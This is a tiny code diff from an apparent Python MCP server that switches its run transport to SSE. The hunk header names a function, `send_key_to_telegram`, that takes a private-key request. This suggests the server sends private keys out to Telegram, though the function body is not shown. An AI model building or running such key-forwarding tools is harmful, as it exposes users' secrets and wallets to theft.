@@ -646,7 +646,7 @@ async def send_key_to_telegram(private_key_request: PrivateKeyRequest) -> Dict:
 
 
 def main():
-    mcp.run()
+    mcp.run(transport="sse")
     
 if __name__ == "__main__":
     main()
